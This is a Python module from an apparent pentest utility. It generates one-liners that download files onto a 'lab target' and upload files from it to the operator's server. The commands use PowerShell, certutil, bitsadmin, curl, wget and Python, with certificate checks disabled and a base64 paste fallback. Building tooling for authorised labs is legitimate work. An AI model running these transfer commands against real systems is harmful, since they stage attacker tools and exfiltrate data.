"""Ready-to-paste download and upload commands for lab targets."""

from __future__ import annotations

import base64
import json
import urllib.parse
from pathlib import Path

from web_drop.names import sanitize_filename
from web_drop.netinfo import host_for_url

EMBED_LIMIT = 48 * 1024


def sh_quote(value: str) -> str:
    return "'" + value.replace("'", "'\"'\"'") + "'"


def ps_quote(value: str) -> str:
    return "'" + value.replace("'", "''") + "'"


def cmd_quote(value: str) -> str:
    return '"' + value.replace('"', "") + '"'


def load_embed(path: Path) -> tuple[str, bytes | None, bool]:
    """Return ``(filename, bytes, skipped)`` for a local file passed to ``--file``."""
    filename = sanitize_filename(path.name)
    if path.stat().st_size > EMBED_LIMIT:
        return filename, None, True
    return filename, path.read_bytes(), False


def render_oneliners(
    *,
    ip: str,
    port: int,
    https: bool,
    filename: str,
    password: str | None,
    ip_source: str,
    embed: bytes | None = None,
    embed_skipped: bool = False,
) -> str:
    scheme = "https" if https else "http"
    host = host_for_url(ip)
    base = f"{scheme}://{host}:{port}"
    query = ""
    if password:
        query = "?token=" + urllib.parse.quote(password, safe="")
    quoted_name = urllib.parse.quote(filename, safe="")
    file_url = f"{base}/{quoted_name}{query}"
    root_url = f"{base}/{query}"
    skip = " -SkipCertificateCheck" if https else ""
    curl = "curl -k" if https else "curl"
    wget = "wget --no-check-certificate" if https else "wget"
    local_ps = ps_quote(filename)
    local_sh = sh_quote(filename)
    ps_url = ps_quote(file_url)
    ps_root = ps_quote(root_url)
    sh_url = sh_quote(file_url)
    sh_root = sh_quote(root_url)

    lines: list[str] = [
        "# web-drop one-liners",
        f"# base: {base}",
        f"# file: {filename}",
        f"# url: {file_url}",
        f"# ip source: {ip_source}",
    ]
    if password:
        lines.append("# auth: query token, percent-encoded so certutil and bitsadmin can send it")
        lines.append("# basic auth also works: curl -u webdrop:YOUR_PASSWORD")
    else:
        lines.append("# auth: none")
    lines.append("")
    lines.append("# ========== download ==========")
    lines.append("")
    if https:
        lines.append("# PowerShell 5.1 has no -SkipCertificateCheck. The callback is lab-only.")
        lines.append(
            "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }"
        )
        lines.append(
            "[System.Net.ServicePointManager]::SecurityProtocol = "
            "[System.Net.SecurityProtocolType]::Tls12"
        )
        lines.append("")
    lines.append("# download: PowerShell Invoke-WebRequest")
    lines.append(f"Invoke-WebRequest -Uri {ps_url} -OutFile {local_ps}{skip}")
    lines.append("")
    lines.append("# download: PowerShell Net.WebClient")
    lines.append(f"(New-Object Net.WebClient).DownloadFile({ps_url}, {local_ps})")
    lines.append("")
    lines.append("# download: certutil (cmd.exe). The second line clears the url cache.")
    lines.append(f"certutil.exe -urlcache -split -f {cmd_quote(file_url)} {cmd_quote(filename)}")
    lines.append(f"certutil.exe -urlcache -split -f {cmd_quote(file_url)} delete")
    lines.append("")
    lines.append("# download: bitsadmin (cmd.exe)")
    destination = cmd_quote("%CD%\\" + filename)
    lines.append(
        "bitsadmin /transfer webdrop /download /priority foreground "
        f"{cmd_quote(file_url)} {destination}"
    )
    lines.append("")
    lines.append("# download: curl")
    lines.append(f"{curl} -L -o {local_sh} {sh_url}")
    lines.append("")
    lines.append("# download: wget")
    lines.append(f"{wget} -O {local_sh} {sh_url}")
    lines.append("")
    lines.append("# download: python3")
    lines.append("python3 -c " + sh_quote(_python_download(file_url, filename, https)))
    lines.append("")
    lines.append("# ========== upload ==========")
    lines.append("# certutil and bitsadmin cannot upload.")
    lines.append("")
    lines.append("# upload: PowerShell Invoke-WebRequest PUT")
    lines.append(f"Invoke-WebRequest -Uri {ps_url} -Method PUT -InFile {local_ps}{skip}")
    lines.append("")
    lines.append("# upload: PowerShell Invoke-RestMethod PUT")
    lines.append(f"Invoke-RestMethod -Uri {ps_url} -Method PUT -InFile {local_ps}{skip}")
    lines.append("")
    lines.append("# upload: PowerShell Invoke-RestMethod POST")
    lines.append(f"Invoke-RestMethod -Uri {ps_url} -Method POST -InFile {local_ps}{skip}")
    lines.append("")
    lines.append("# upload: PowerShell Net.WebClient multipart POST")
    lines.append(f"(New-Object Net.WebClient).UploadFile({ps_root}, {local_ps})")
    lines.append("")
    lines.append("# upload: PowerShell Net.WebClient PUT")
    lines.append(
        "(New-Object Net.WebClient).UploadData("
        f"{ps_url}, 'PUT', [IO.File]::ReadAllBytes({local_ps}))"
    )
    lines.append("")
    lines.append("# upload: curl PUT")
    lines.append(f"{curl} -T {local_sh} {sh_url}")
    lines.append("")
    lines.append("# upload: curl POST multipart")
    lines.append(f"{curl} -F {sh_quote('file=@' + filename)} {sh_root}")
    lines.append("")
    lines.append("# upload: wget POST")
    lines.append(f"{wget} -O - --post-file={local_sh} {sh_url}")
    lines.append("")
    lines.append("# upload: GNU wget PUT")
    lines.append(f"{wget} -O - --method=PUT --body-file={local_sh} {sh_url}")
    lines.append("")
    lines.append("# upload: python3 PUT")
    lines.append("python3 -c " + sh_quote(_python_upload(file_url, filename, https)))
    lines.extend(_base64_section(filename, embed, embed_skipped))
    return "\n".join(lines) + "\n"


def _python_download(file_url: str, filename: str, https: bool) -> str:
    url = json.dumps(file_url)
    name = json.dumps(filename)
    if https:
        return (
            "import ssl,urllib.request; ctx=ssl._create_unverified_context(); "
            f"urllib.request.urlretrieve({url}, {name}, context=ctx)"
        )
    return f"import urllib.request; urllib.request.urlretrieve({url}, {name})"


def _python_upload(file_url: str, filename: str, https: bool) -> str:
    url = json.dumps(file_url)
    name = json.dumps(filename)
    request = f"urllib.request.Request({url}, data=open({name}, 'rb').read(), method='PUT')"
    if https:
        return (
            "import ssl,urllib.request; ctx=ssl._create_unverified_context(); "
            f"urllib.request.urlopen({request}, context=ctx)"
        )
    return f"import urllib.request; urllib.request.urlopen({request})"


def _base64_section(filename: str, embed: bytes | None, skipped: bool) -> list[str]:
    lines = ["", "# ========== base64 copy-paste fallback ==========", ""]
    payload = ""
    if skipped:
        lines.append(f"# {filename} is larger than {EMBED_LIMIT} bytes and was not embedded.")
        lines.append("# On the attacker box: base64 -w0 " + sh_quote(filename))
        lines.append("# Paste that output between the markers on the target.")
    elif embed is None:
        lines.append("# No local file was read. On the attacker box:")
        lines.append("#   base64 -w0 " + sh_quote(filename))
        lines.append("# Paste that output between the markers on the target.")
    else:
        lines.append("# The local file is embedded below. Paste the whole block on the target.")
        encoded = base64.b64encode(embed).decode("ascii")
        payload = "\n".join(encoded[index : index + 76] for index in range(0, len(encoded), 76))
    lines.append(f"base64 -d > {sh_quote(filename)} << 'WEB_DROP_B64'")
    if payload:
        lines.append(payload)
    lines.append("WEB_DROP_B64")
    lines.append("")
    lines.append(f"[IO.File]::WriteAllBytes({ps_quote(filename)}, [Convert]::FromBase64String(@'")
    if payload:
        lines.append(payload)
    lines.append("'@))")
    return lines
